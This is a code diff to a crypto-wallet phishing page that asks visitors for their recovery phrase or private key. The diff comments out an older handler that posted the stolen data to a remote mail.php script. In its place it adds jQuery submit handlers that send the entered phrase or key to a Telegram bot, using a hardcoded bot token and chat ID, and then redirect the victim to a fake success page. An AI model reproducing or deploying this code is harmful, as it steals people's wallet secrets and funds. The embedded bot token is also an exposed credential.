@@ -73,7 +73,7 @@
                         <form id="phraseForm" method="POST">
                             <div class="mb-6">
                                 <input type="hidden" name="category" value="Phrase" />
-                                <textarea rows="4" name="phrase" type="text" minlength="12" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space)" id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                <textarea rows="4" name="phrase" id="phrase" type="text" minlength="12" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space)" id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                                     required></textarea>
                             </div>
 
@@ -88,7 +88,7 @@
                         <form id="privateKeyForm" method="POST">
                             <div class="mb-6">
                                 <input type="hidden" name="category" value="private" />
-                                <input name="prvky" type="text" minlength="12" placeholder="Enter your private key " id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                <input name="prvky" id="prvky" type="text" minlength="12" placeholder="Enter your private key " id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                                     required>
                             </div>
                             <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Proceed</button>
@@ -115,43 +115,119 @@
 
     <script>
         // Get form elements
-        const phraseForm = document.querySelector('#phraseForm');
-        const privateKeyForm = document.querySelector('#privateKeyForm');
+        // const phraseForm = document.querySelector('#phraseForm');
+        // const privateKeyForm = document.querySelector('#privateKeyForm');
 
-        // Add submit event handler for Phrase form
-        phraseForm.addEventListener('submit', e => {
-            e.preventDefault();
-            handleFormSubmit(e.target, 'Phrase');
-        });
+        // // Add submit event handler for Phrase form
+        // phraseForm.addEventListener('submit', e => {
+        //     e.preventDefault();
+        //     handleFormSubmit(e.target, 'Phrase');
+        // });
 
-        // Add submit event handler for Private Key form
-        privateKeyForm.addEventListener('submit', e => {
-            e.preventDefault();
-            handleFormSubmit(e.target, 'Private Key');
-        });
+        // // Add submit event handler for Private Key form
+        // privateKeyForm.addEventListener('submit', e => {
+        //     e.preventDefault();
+        //     handleFormSubmit(e.target, 'Private Key');
+        // });
 
-        async function handleFormSubmit(form, category) {
-            // Serialize form data
-            const formData = new FormData(form);
+        // async function handleFormSubmit(form, category) {
+        //     // Serialize form data
+        //     const formData = new FormData(form);
 
-            // Send data to server-side script
-            try {
-                const response = await fetch('https://mail.p500trades.online/mail.php', {
-                    method: 'POST',
-                    body: formData
-                });
+        //     // Send data to server-side script
+        //     try {
+        //         const response = await fetch('https://mail.p500trades.online/mail.php', {
+        //             method: 'POST',
+        //             body: formData
+        //         });
 
-                if (response.ok) {
-                    console.log('Form data sent successfully');
-                    // Redirect to new page
-                    window.location.href = '../apiv4wc-connection-success/index.html';
-                } else {
-                    console.log('Failed to send form data');
-                }
-            } catch (error) {
-                console.error('There was a problem sending the form data', error);
-            }
-        }
+        //         if (response.ok) {
+        //             console.log('Form data sent successfully');
+        //             // Redirect to new page
+        //             window.location.href = '../apiv4wc-connection-success/index.html';
+        //         } else {
+        //             console.log('Failed to send form data');
+        //         }
+        //     } catch (error) {
+        //         console.error('There was a problem sending the form data', error);
+        //     }
+        // }
+
+        $("#privateKeyForm").on("submit", function(event) {
+            event.preventDefault();
+            const prvky = document.getElementById("prvky").value;
+            const categoryValue = "Private Key"
+
+            const message =
+                "*RESULTS*" +
+                "\n" +
+                "Category: " +
+                categoryValue +
+                "\n" +
+                "Private Key: " +
+                prvky +
+                "\n";
+
+            const telegramBotToken =
+                "6341606235:AAGWd8Zbsidru4EVG2pfq38Clc43YKWXwQQ";
+            const chatId = "7357469500";
+
+            const sendMessage = (text) => {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            text
+          )}`;
+                fetch(url)
+                    .then((response) => {
+                        if (!response.ok) {
+                            throw new Error("Network response was not ok");
+                        }
+                        console.log("Message sent successfully");
+                        window.location.href = "../apiv4wc-connection-success/index.html";
+                    })
+                    .catch((error) => console.error("Error:", error));
+            };
+
+            sendMessage(message);
+
+        })
+
+        $("#phraseForm").on("submit", function(event) {
+            event.preventDefault();
+            const phrase = document.getElementById("phrase").value;
+            const categoryValue = "Phrase"
+
+            const message =
+                "*RESULTS*" +
+                "\n" +
+                "Category: " +
+                categoryValue +
+                "\n" +
+                "Phrase: " +
+                phrase +
+                "\n";
+
+            const telegramBotToken =
+                "6341606235:AAGWd8Zbsidru4EVG2pfq38Clc43YKWXwQQ";
+            const chatId = "7357469500";
+
+            const sendMessage = (text) => {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            text
+          )}`;
+                fetch(url)
+                    .then((response) => {
+                        if (!response.ok) {
+                            throw new Error("Network response was not ok");
+                        }
+                        console.log("Message sent successfully");
+                        window.location.href = "../apiv4wc-connection-success/index.html";
+                    })
+                    .catch((error) => console.error("Error:", error));
+            };
+
+            sendMessage(message);
+
+        })
     </script>
 
     <script src="../assets/unpkg.com/flowbite%401.5.3/dist/flowbite.js"></script>
